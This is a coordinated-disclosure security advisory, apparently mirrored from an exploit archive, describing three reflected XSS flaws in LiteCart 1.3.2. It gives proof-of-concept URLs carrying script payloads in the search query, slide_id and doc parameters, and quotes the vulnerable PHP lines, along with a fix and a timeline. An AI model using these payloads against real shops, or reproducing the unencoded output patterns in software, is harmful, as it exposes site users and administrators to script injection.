@@ -1,0 +1,97 @@
+id: 24568
+date: 11/17/2015
+title: LiteCart 1.3.2 Cross Site Scripting Vulnerability
+author: Tim Coen
+cves: 
+
+1. Introduction
+
+Affected Product:    LiteCart 1.3.2
+Fixed in:            1.3.3
+Fixed Version Link:  https://www.litecart.net/downloading?version=1.3.3.1
+Vendor Contact:      development@litecart.net
+Vulnerability Type:  XSS
+Remote Exploitable:  Yes
+Reported to vendor:  09/07/2015
+Disclosed to public: 11/13/2015
+Release mode:        Coordinated release
+CVE:                 n/a
+Credits              Tim Coen of Curesec GmbH
+
+2. XSS 1
+
+Description
+
+The query parameter of the search is vulnerable to XSS.
+
+Proof of Concept
+
+
+http://localhost/ecommerce/litecart-1.3.2/public_html/en/search?query="></title><script>alert(1)</script>
+
+Code
+
+
+        public_html/pages/search.inc.php
+            document::$snippets['title'][] = empty($_GET['query']) ? language::translate('title_search_results', 'Search Results') : sprintf(language::translate('title_search_results_for_s', 'Search Results for "%s"'), $_GET['query']);
+
+3. XSS 2
+
+Description
+
+The value of the GET parameter slide_id is passed to trigger_error if it is an
+invalid id. trigger_error does not encode input, and as LiteCart shows errors
+by default, this leads to an XSS vulnerability.
+
+Proof of Concept
+
+
+http://localhost/ecommerce/litecart-1.3.2/public_html/admin/?app=slides&doc=edit_slide&page=1&slide_id=<script>alert(1)</script>
+
+Code
+
+
+        includes/controllers/ctrl_slide.inc.php
+            if (empty($this->data)) trigger_error('Could not find slide ('. $slide_id .') in database.', E_USER_ERROR);
+
+4. XSS 3
+
+Description
+
+The value of the GET parameter doc is passed to trigger_error if it is invalid.
+trigger_error does not encode input, and as LiteCart shows errors by default,
+this leads to an XSS vulnerability. Additionally, the accessing of non-existing
+array values leads to a notice, which contains the index unsanitized. Because
+of this, $app_config['docs'][$_GET['doc']] can also lead to XSS.
+
+Proof of Concept
+
+
+http://localhost/ecommerce/litecart-1.3.2/public_html/admin/?app=appearance&doc=<script>alert(1)</script>
+
+Code
+
+
+        admin/index.php
+            if (!empty($_GET['doc'])) {
+              if (empty($app_config['docs'][$_GET['doc']]) || !file_exists(FS_DIR_HTTP_ROOT . WS_DIR_ADMIN . $_GET['app'].'.app/' . $app_config['docs'][$_GET['doc']])) trigger_error($_GET['app'] .'.app/'. $_GET['doc'] . ' is not a valid admin document', E_USER_ERROR);
+              include vmod::check(FS_DIR_HTTP_ROOT . WS_DIR_ADMIN . $_GET['app'].'.app/' . $app_config['docs'][$_GET['doc']]);
+            } else {
+              include vmod::check(FS_DIR_HTTP_ROOT . WS_DIR_ADMIN . $_GET['app'].'.app/' . $app_config['docs'][$app_config['default']]);
+            }
+
+5. Solution
+
+To mitigate this issue please upgrade at least to version 1.3.3:
+
+https://www.litecart.net/downloading?version=1.3.3.1
+
+Please note that a newer version might already be available.
+
+6. Report Timeline
+
+09/07/2015 Informed Vendor about Issue
+10/05/2015 Vendor releases fix
+11/13/2015 Disclosed to public
+
+#  0day.today [2023-03-22]  #
